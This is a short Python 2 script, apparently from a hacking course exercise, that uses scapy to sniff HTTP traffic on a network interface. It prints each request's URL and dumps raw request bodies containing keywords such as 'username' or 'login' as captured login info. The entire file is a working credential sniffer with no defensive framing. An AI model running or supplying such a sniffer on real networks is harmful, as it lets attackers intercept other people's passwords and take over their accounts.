#!/usr/bin/env/ python2.7

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)


def get_packet_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        keywords = ["email", "username", "login", "user"]
        for keyword in keywords:
            if keyword in packet[scapy.Raw].load:
                return packet[scapy.Raw].load


def process_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        # display urls
        print ("[+] HTTP Request >> " + get_packet_url(packet))

        login_info = get_login_info(packet)
        if login_info:
            print ("\n\nCaptured login info >> " + login_info)
        # print (packet.show())


sniff("eth0")
